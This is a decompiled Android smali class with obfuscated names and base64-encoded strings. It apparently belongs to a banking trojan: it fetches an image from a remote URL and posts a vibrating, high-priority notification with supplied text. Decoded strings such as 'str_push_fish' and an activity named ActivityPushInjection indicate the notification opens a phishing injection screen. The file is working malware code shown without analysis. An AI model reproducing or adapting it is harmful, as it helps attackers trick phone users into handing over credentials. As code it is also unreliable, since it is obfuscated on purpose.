.class public Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;
.super Landroid/os/AsyncTask;
.source ""


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lnaqsl/ebxcb/exu/ServiceModuleNotification;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "fddo"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Landroid/graphics/Bitmap;",
        ">;"
    }
.end annotation


# instance fields
.field private fddo:Landroid/content/Context;

.field private for:Ljava/lang/String;

.field private ifdf:Ljava/lang/String;

.field private int:Ljava/lang/String;

.field private new:Ljava/lang/String;

.field final synthetic try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;


# direct methods
.method public constructor <init>(Lnaqsl/ebxcb/exu/ServiceModuleNotification;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .registers 7

    iput-object p1, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    iput-object p2, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo:Landroid/content/Context;

    iput-object p3, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->ifdf:Ljava/lang/String;

    iput-object p4, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->for:Ljava/lang/String;

    iput-object p5, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->int:Ljava/lang/String;

    iput-object p6, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->new:Ljava/lang/String;

    iget-object p2, p1, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string p2, "RVJST1I="

    invoke-static {p2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    iget-object p1, p1, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string p1, "Mg=="

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p2, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .registers 2

    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo([Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object p1

    return-object p1
.end method

.method protected varargs fddo([Ljava/lang/String;)Landroid/graphics/Bitmap;
    .registers 4

    iget-object p1, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    iget-object v0, p1, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string p1, "UFVTSA=="

    invoke-static {p1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    iget-object v1, v1, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "Mw=="

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, p1, v1}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;)V

    const/4 p1, 0x0

    :try_start_1a
    new-instance v0, Ljava/net/URL;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->int:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-static {v0}, Landroid/graphics/BitmapFactory;->decodeStream(Ljava/io/InputStream;)Landroid/graphics/Bitmap;

    move-result-object p1
    :try_end_36
    .catch Ljava/net/MalformedURLException; {:try_start_1a .. :try_end_36} :catch_36
    .catch Ljava/io/IOException; {:try_start_1a .. :try_end_36} :catch_36

    :catch_36
    return-object p1
.end method

.method protected fddo(Landroid/graphics/Bitmap;)V
    .registers 10
    .annotation build Landroid/annotation/TargetApi;
        value = 0x10
    .end annotation

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    :try_start_3
    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    iget-object v0, v0, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo:Landroid/content/Context;

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    iget-object v2, v2, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v2, "c3RyX3B1c2hfZmlzaA=="

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->new:Ljava/lang/String;

    invoke-virtual {v0, v1, v2, v3}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    const-class v2, Lnaqsl/ebxcb/exu/Activity/ActivityPushInjection;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    iget-object v1, v1, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "c3Ry"

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->new:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v4

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x19

    if-gt v0, v2, :cond_da

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo:Landroid/content/Context;

    const/16 v2, 0x64

    invoke-static {v0, v2, v4, v1}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo:Landroid/content/Context;

    const-string v2, "notification"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    new-instance v2, Landroid/app/Notification$Builder;

    iget-object v3, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo:Landroid/content/Context;

    invoke-direct {v2, v3}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    invoke-virtual {v2, v0}, Landroid/app/Notification$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroid/app/Notification$Builder;

    move-result-object v0

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->ifdf:Ljava/lang/String;

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->for:Ljava/lang/String;

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v2, 0x5

    new-array v2, v2, [J

    const/4 v3, 0x0

    const-wide/16 v4, 0x3e8

    aput-wide v4, v2, v3

    const/4 v3, 0x1

    aput-wide v4, v2, v3

    const/4 v6, 0x2

    aput-wide v4, v2, v6

    const/4 v7, 0x3

    aput-wide v4, v2, v7

    const/4 v7, 0x4

    aput-wide v4, v2, v7

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setVibrate([J)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v3}, Landroid/app/Notification$Builder;->setPriority(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v6}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v3}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v7}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo:Landroid/content/Context;

    invoke-virtual {v2}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo:Landroid/content/Context;

    invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    iget-object v5, v5, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "Om1pcG1hcC9pY19sYXVuY2hlcg=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v2, v4, v5, v5}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/app/Notification$Builder;->setLargeIcon(Landroid/graphics/Bitmap;)Landroid/app/Notification$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    iget v0, p1, Landroid/app/Notification;->flags:I

    or-int/lit8 v0, v0, 0x10

    iput v0, p1, Landroid/app/Notification;->flags:I

    invoke-virtual {v1, v3, p1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    goto :goto_e8

    :cond_da
    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->try:Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    iget-object v2, v0, Lnaqsl/ebxcb/exu/ServiceModuleNotification;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v3, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo:Landroid/content/Context;

    iget-object v6, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->ifdf:Ljava/lang/String;

    iget-object v7, p0, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->for:Ljava/lang/String;

    move-object v5, p1

    invoke-virtual/range {v2 .. v7}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Landroid/content/Intent;Landroid/graphics/Bitmap;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_e8
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_e8} :catch_e8

    :catch_e8
    :goto_e8
    return-void
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .registers 2
    .annotation build Landroid/annotation/TargetApi;
        value = 0x10
    .end annotation

    check-cast p1, Landroid/graphics/Bitmap;

    invoke-virtual {p0, p1}, Lnaqsl/ebxcb/exu/ServiceModuleNotification$fddo;->fddo(Landroid/graphics/Bitmap;)V

    return-void
.end method
